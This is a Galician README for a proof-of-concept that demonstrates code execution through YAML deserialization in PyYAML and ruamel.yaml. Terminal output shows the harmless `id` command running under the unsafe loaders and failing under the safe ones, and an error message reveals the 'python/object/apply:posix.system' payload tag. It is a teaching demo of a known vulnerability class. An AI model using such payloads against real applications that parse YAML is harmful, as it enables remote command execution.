# YAML injection

Estes exemplos permiten comprobar como se executa código cando cargamos un
fichero yaml usando pyyaml ou ruamel.

Primeiro, instalamos as dependencias con:
```
pip install -r requirements.txt
```

E podemos xerar o un yaml malicioso con `create-rce-pyyaml.py` ou
`create-rce-ruamel.py` e podemolo probar con `pyyaml-load.py` ou
`ruamel-load.py`.

Deixo aquí un par de exemplos. Pode que se os executes a saída do comando varíe
debido á versión de pyyaml ou ruamel que uses sexa diferente. No meu caso as
versións son:
- pyyaml 6.0.2
- ruamel.yaml 0.18.6
- Python 3.11.2

Exemplo con pyyaml:
```
$ python3 create-rce-pyyaml.py 
Payload saved into rce-pyyaml.yaml

$ python3 load-pyyaml.py rce-pyyaml.yaml 
=== Loader=CLoader ===
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),113(lpadmin),116(scanner)

=== Loader=FullLoader ===
fail!!

=== Loader=Loader ===
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),113(lpadmin),116(scanner)

=== Loader=SafeLoader ===
fail!!

=== Loader=UnsafeLoader ===
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),113(lpadmin),116(scanner)

=== safe_load ===
fail!!

=== unsafe_load ===
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),113(lpadmin),116(scanner)
```

Exemplo con ruamel:
```
$ python3 create-rce-ruamel.py 
Payload saved into rce-ruamel.yaml

$ python3 load-ruamel.py rce-ruamel.yaml 
=== Using YAML() ===
['id']
=== Using YAML(typ='safe') ===
Error: could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply:posix.system'
  in "<unicode string>", line 1, column 1

=== Using YAML(typ='unsafe') ===
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),113(lpadmin),116(scanner)
0
```
